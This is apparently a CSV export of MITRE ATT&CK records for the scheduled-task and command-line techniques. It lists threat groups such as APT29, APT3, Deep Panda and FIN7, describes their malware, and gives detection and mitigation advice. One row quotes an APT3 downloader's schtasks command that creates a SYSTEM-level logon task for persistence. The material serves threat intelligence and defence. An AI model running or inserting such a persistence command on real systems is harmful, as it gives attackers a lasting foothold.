whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
983,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['One persistence mechanism used by [[Software/S0046|CozyCar]] is to register itself as a scheduled task.[[CiteRef::F-Secure CozyDuke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: CozyCar, CozyDuke, ...","['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
984,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0050|CosmicDuke]] uses scheduled tasks typically named ""Watchmon Service"" for persistence.[[CiteRef::F-Secure Cosmicduke]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: CosmicDuke, TinyBaron, ...","['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
985,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0016|APT29]] used named and hijacked scheduled tasks to establish persistence.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
986,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0111|schtasks]] is used to schedule tasks on a Windows system to run at a specific date and time.[[CiteRef::TechNet Schtasks]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: schtasks, schtasks.exe","['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
987,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['An [[Group/G0022|APT3]] downloader creates persistence by creating the following scheduled task: <code>schtasks /create /tn ""mysc"" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru ""System""</code>.[[CiteRef::FireEye Operation Double Tap]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
988,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0045|menuPass]] has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
989,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0027|Threat Group-3390]] actors use [[Software/S0110|at]] to schedule tasks to run self-extracting RAR archives, which install [[Software/HTTPBrowser|HTTPBrowser]] or [[Software/PlugX|PlugX]] on other victims on a network.']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",['Technique/T1053'],['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
990,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0068|httpclient]] opens cmd.exe on the victim.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: httpclient,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
991,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0065|4H RAT]] has the capability to create a remote shell.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: 4H RAT,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
992,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0032|gh0st]] RAT is able to open a command shell.[[CiteRef::FireEye Hacking Team]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: gh0st,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
993,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0074|Sakula]] calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. [[Software/S0074|Sakula]] also has the capability to invoke a reverse shell.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Sakula, Sakurel, VIPER",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
994,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0080|Mivast]] has the capability to open a remote shell and run basic commands.[[CiteRef::Symantec Backdoor.Mivast]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Mivast,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
995,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0021|Derusbi]] is capable of creating a remote Bash shell and executing commands.[[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Derusbi,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
996,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0142|StreamEx]] has the ability to remotely execute commands.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: StreamEx,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
997,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0146|TEXTMATE]] executes cmd.exe to provide  a reverse shell to attackers.[[CiteRef::FireEye FIN7 March 2017]][[CiteRef::Cisco DNSMessenger March 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: TEXTMATE, DNSMessenger",['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
998,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0147|Pteranodon]] can execute commands on the victim.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: Pteranodon,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
999,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0032|gh0st]] RAT is able to open a command shell.[[CiteRef::FireEye Hacking Team]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],Software: gh0st,['Execution'],['Technique/T1059'],['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
